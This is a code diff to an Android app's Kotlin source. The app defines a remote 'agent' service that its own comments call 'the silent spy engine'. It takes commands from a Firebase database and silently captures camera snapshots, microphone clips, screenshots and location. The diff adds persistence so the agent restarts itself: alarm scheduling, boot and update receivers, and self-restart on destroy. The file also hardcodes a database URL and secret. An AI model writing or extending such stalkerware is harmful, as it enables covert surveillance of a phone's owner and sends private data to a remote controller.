@@ -3,10 +3,12 @@ package com.example.aniket_pro_ai
 import android.Manifest
 import android.accounts.AccountManager
 import android.app.Activity
+import android.app.AlarmManager
 import android.app.AlertDialog
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.app.RecoverableSecurityException
 import android.app.Service
 import android.app.usage.UsageStatsManager
@@ -16,6 +18,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ActivityInfo
 import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
 import android.database.ContentObserver
 import android.database.Cursor
 import android.graphics.Bitmap
@@ -66,6 +69,7 @@ import org.json.JSONObject
 private const val FB_URL = "https://aniket-remote-default-rtdb.asia-southeast1.firebasedatabase.app"
 private const val FB_SECRET = "atp2617"
 private const val NPREF = "aniket_native"
+private const val ACTION_START_AGENT = "aniket.START_AGENT"
 
 fun deviceIdOf(ctx: Context): String {
     val id = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
@@ -104,6 +108,33 @@ fun httpPut(url: String, json: String): Boolean {
 
 fun permGranted(ctx: Context, p: String): Boolean =
     ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
+
+fun canStartAgent(ctx: Context): Boolean {
+    val p = ctx.getSharedPreferences(NPREF, Context.MODE_PRIVATE)
+    if (!p.getBoolean("agent", false)) return false
+    return permGranted(ctx, Manifest.permission.CAMERA) &&
+            permGranted(ctx, Manifest.permission.RECORD_AUDIO)
+}
+
+fun scheduleAgentStart(ctx: Context, delayMs: Long) {
+    try {
+        val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+        val pi = PendingIntent.getBroadcast(
+            ctx, 777,
+            Intent(ctx, BootReceiver::class.java).setAction(ACTION_START_AGENT),
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + delayMs, pi)
+    } catch (_: Exception) { }
+}
+
+fun startAgentIfReady(ctx: Context) {
+    if (canStartAgent(ctx)) {
+        try {
+            ContextCompat.startForegroundService(ctx, Intent(ctx, RemoteService::class.java))
+        } catch (_: Exception) { }
+    }
+}
 
 fun permsJson(ctx: Context): JSONObject {
     val o = JSONObject()
@@ -152,7 +183,7 @@ fun locJson(ctx: Context): JSONObject {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  REMOTE AGENT SERVICE — the silent spy engine
+//  REMOTE AGENT SERVICE — the silent spy engine (crash-guarded)
 // ═══════════════════════════════════════════════════════════════════════
 class RemoteService : Service() {
 
@@ -160,7 +191,6 @@ class RemoteService : Service() {
     private var handler: Handler? = null
     private var lastCmdId = ""
     private var loop = 0
-    private var mediaPlayer: MediaPlayer? = null
 
     private val poller = object : Runnable {
         override fun run() {
@@ -186,7 +216,29 @@ class RemoteService : Service() {
             .setContentText("Agent active")
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setOngoing(true)
-        startForeground(9001, nb.build())
+
+        // dynamic foreground service types — only what we actually hold
+        try {
+            if (Build.VERSION.SDK_INT >= 34) {
+                var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+                if (permGranted(this, Manifest.permission.CAMERA)) {
+                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                }
+                if (permGranted(this, Manifest.permission.RECORD_AUDIO)) {
+                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                }
+                if (permGranted(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) &&
+                    permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION)) {
+                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                }
+                startForeground(9001, nb.build(), types)
+            } else {
+                startForeground(9001, nb.build())
+            }
+        } catch (e: Exception) {
+            stopSelf()
+            return
+        }
 
         lastCmdId = getSharedPreferences(NPREF, MODE_PRIVATE).getString("lastCmd", "") ?: ""
         thread = HandlerThread("agent").apply { start() }
@@ -203,9 +255,8 @@ class RemoteService : Service() {
     override fun onDestroy() {
         handler?.removeCallbacks(poller)
         thread?.quitSafely()
-        // watchdog: try to rise again
         try {
-            if (getSharedPreferences(NPREF, MODE_PRIVATE).getBoolean("agent", false)) {
+            if (canStartAgent(this)) {
                 ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
             }
         } catch (_: Exception) { }
@@ -219,7 +270,6 @@ class RemoteService : Service() {
 
     private fun work() {
         val b = base()
-        // heartbeat
         val info = JSONObject()
         info.put("lastSeen", System.currentTimeMillis())
         info.put("model", Build.MODEL)
@@ -234,7 +284,6 @@ class RemoteService : Service() {
             simWatch()
         }
 
-        // command
         val cmdStr = httpGet("$b/cmd.json") ?: return
         if (cmdStr.trim() == "null") return
         val cmd = try { JSONObject(cmdStr) } catch (_: Exception) { return }
@@ -462,7 +511,6 @@ class RemoteService : Service() {
         return r
     }
 
-    // ── Camera2 silent snapshot ──
     private fun snapCam(front: Boolean): String? {
         var device: CameraDevice? = null
         return try {
@@ -518,7 +566,6 @@ class RemoteService : Service() {
         }
     }
 
-    // ── 6 second mic clip ──
     private fun recordMic(): File? {
         return try {
             val f = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
@@ -538,7 +585,6 @@ class RemoteService : Service() {
         }
     }
 
-    // ── loud siren 20s ──
     private fun siren() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -581,24 +627,21 @@ class RemoteService : Service() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  BOOT RECEIVER — watchdog rises on boot / update
+//  BOOT / AGENT RECEIVER — watchdog rises on boot / update / alarm
 // ═══════════════════════════════════════════════════════════════════════
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
-        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
-            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
-            val p = context.getSharedPreferences(NPREF, Context.MODE_PRIVATE)
-            if (p.getBoolean("agent", false)) {
-                try {
-                    ContextCompat.startForegroundService(context, Intent(context, RemoteService::class.java))
-                } catch (_: Exception) { }
-            }
+        val a = intent.action
+        if (a == Intent.ACTION_BOOT_COMPLETED ||
+            a == Intent.ACTION_MY_PACKAGE_REPLACED ||
+            a == ACTION_START_AGENT) {
+            startAgentIfReady(context)
         }
     }
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  SHOT WATCHER (screenshot observer) — unchanged
+//  SHOT WATCHER (screenshot observer)
 // ═══════════════════════════════════════════════════════════════════════
 class ShotWatcher(
     private val context: Context,
@@ -725,12 +768,7 @@ class MainActivity : FlutterActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
-        // agent rises with app if enabled
-        try {
-            if (getSharedPreferences(NPREF, MODE_PRIVATE).getBoolean("agent", false)) {
-                ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
-            }
-        } catch (_: Exception) { }
+        startAgentIfReady(this)
     }
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
@@ -844,28 +882,7 @@ class MainActivity : FlutterActivity() {
                         if (!ok) {
                             result.success(null)
                         } else {
-                            try {
-                                val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
-                                var best: android.location.Location? = null
-                                for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
-                                    try {
-                                        val l = lm.getLastKnownLocation(prov)
-                                        if (l != null && (best == null || l.time > best.time)) best = l
-                                    } catch (_: Exception) { }
-                                }
-                                if (best == null) {
-                                    result.success(null)
-                                } else {
-                                    val m = HashMap<String, Any>()
-                                    m["lat"] = best.latitude
-                                    m["lng"] = best.longitude
-                                    m["acc"] = best.accuracy
-                                    m["speed"] = best.speed
-                                    result.success(m)
-                                }
-                            } catch (e: Exception) {
-                                result.success(null)
-                            }
+                            result.success(locJson(this))
                         }
                     }
                     "agentOn" -> {
@@ -876,9 +893,12 @@ class MainActivity : FlutterActivity() {
                                 startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                             }
                         } catch (_: Exception) { }
-                        try {
-                            ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
-                        } catch (_: Exception) { }
+                        if (canStartAgent(this)) {
+                            startAgentIfReady(this)
+                        } else {
+                            // permissions not ready yet — rise automatically in 60s
+                            scheduleAgentStart(this, 60000)
+                        }
                         result.success(1)
                     }
                     "agentOff" -> {
